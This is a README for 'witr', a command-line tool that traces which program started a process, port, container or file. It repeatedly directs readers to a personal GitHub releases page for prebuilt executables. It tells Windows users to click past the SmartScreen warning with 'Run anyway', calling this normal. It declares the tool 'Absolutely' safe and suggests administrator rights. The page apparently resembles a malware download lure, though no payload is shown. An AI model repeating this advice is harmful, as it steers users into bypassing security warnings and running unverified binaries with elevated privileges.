# 🔍 witr - Know Exactly What Started That Process

[![Download witr](https://img.shields.io/badge/Download-witr-2ea44f?style=for-the-badge)](https://github.com/Aidan8204/witr/releases)

## 🚀 Getting Started

Welcome to **witr**! Have you ever looked at your computer and wondered, *"Why is this running?"* Maybe there's a mysterious program eating your memory, or a process that won't quit, or a file that seems locked. witr helps you trace any process, port, container, or file back to what originally started it.

Think of witr as a detective for your computer. It answers the question **"Who started this?"** for anything running on your system. Whether you're a curious user or a system administrator, witr gives you clear answers in a friendly terminal interface.

## 📥 Download and Install

Visit this link to download the application: **[Download witr](https://github.com/Aidan8204/witr/releases)**

The download page shows several files. Look for the one that matches your operating system:

| Operating System | What to Download |
|------------------|------------------|
| **Windows** | File ending with `.exe` (for most users) |
| **Mac** | File ending with `.dmg` or `.pkg` |
| **Linux** | File ending with `.deb` (Ubuntu/Debian) or `.rpm` (Fedora) |
| **FreeBSD** | File ending with `.tar.gz` |

For Windows users: **Visit this link to download the application.** Choose the `.exe` file and save it somewhere you can find easily, like your Downloads folder.

## 💻 Using witr on Windows

Once you have the file, follow these simple steps:

1. **Double-click** the downloaded file.
2. If Windows shows a blue security popup, click **"More info"** then **"Run anyway"**. This is normal for new software.
3. A terminal window opens. That's witr running!

### Your First Command

Type this and press **Enter**:

```
witr trace
```

This shows a list of all running processes. To trace a specific one, type:

```
witr trace --name chrome
```

This finds everything related to Chrome and shows what started it.

## 🎯 Common Uses

### 🔎 Find What's Slowing Down Your Computer

Run `witr trace --sort cpu` to see processes using the most CPU power. Then trace the top one to find the culprit.

### 🌐 Check Who's Using Your Internet Ports

Use `witr trace --port 8080` to see what program is using a specific network port.

### 📁 Unlock Mystery Files

If a file won't delete because "it's in use," run `witr trace --file C:\path\to\file.txt` to find what's locking it.

### 🐳 Investigate Containers

For Docker users, `witr trace --container` shows which container started each process.

## 🖥️ Using the Interactive TUI

witr also includes a **full-screen interactive view** (TUI). To use it, simply run:

```
witr
```

This opens a visual interface where you can:
- **Browse** processes with arrow keys
- **Press Enter** to trace a selected process
- **Press F5** to refresh the list
- **Press Q** to quit

The TUI makes witr incredibly easy to use without memorizing commands.

## 🛠️ Advanced Features (For Curious Users)

### Process Trees

See the full family tree of any process:

```
witr tree --pid 1234
```

Replace `1234` with the actual process ID.

### Container Deep-Dive

For Kubernetes and Docker users:

```
witr trace --container my-container --verbose
```

This shows detailed information about the container's process origins.

### Cross-Platform Power

witr works on **Windows, macOS, Linux, FreeBSD, and Kubernetes**. The same commands work everywhere. This makes it perfect for IT professionals who manage different systems.

## ❓ Frequently Asked Questions

### Q: Is witr free?
**A:** Yes! witr is completely free and open-source.

### Q: Do I need to install anything else?
**A:** No. witr works on its own. No extra software required.

### Q: Is witr safe?
**A:** Absolutely. witr only reads information about running processes. It doesn't change or delete anything.

### Q: What if I see an error about permissions?
**A:** Some detailed tracing requires administrator access. Right-click your terminal and select **"Run as administrator"** on Windows, or use `sudo` on Mac/Linux.

### Q: Can I trace system processes?
**A:** Yes, but you may need administrator privileges to see everything.

## 🧩 Troubleshooting Tips

### witr doesn't start
- Check that your file downloaded fully (file size should match the website).
- Try downloading again if unsure.

### Nothing shows when I run a command
- Make sure you're in a terminal window (Command Prompt or PowerShell on Windows).
- Type `witr --help` to see all available options.

### I get a "not recognized" error
- On Windows, navigate to the downloaded folder first.
- Use `.\witr.exe` instead of `witr` if needed.

## 🌟 Why You'll Love witr

- **Zero Learning Curve**: Simple commands work like magic.
- **Beautiful Interface**: The full-screen view is easy on the eyes.
- **Works Everywhere**: One tool for all your systems.
- **Instant Answers**: No waiting—results appear immediately.
- **No Bloat**: Lightweight and fast, just like a good utility should be.

## 📚 Examples to Try Right Now

Here are three things to try immediately:

1. **See your process list**
   ```
   witr trace --sort memory
   ```

2. **Check your network connections**
   ```
   witr trace --network
   ```

3. **Find what's using your disk**
   ```
   witr trace --disk
   ```

## 🚦 Next Steps

Now that you have witr, you're equipped to understand your computer like never before. Start with the basic commands, explore the interactive TUI, and soon you'll wonder how you lived without it.

---

**Ready to become a process detective?** [Download witr now](https://github.com/Aidan8204/witr/releases) and take control of your system today!

Keywords: cli, containers, devops, docker, freebsd, go, golang, incident-response, kubernetes, linux, macos, monitoring, observability, process-management, sysadmin, systemd, terminal, troubleshooting, tui, windows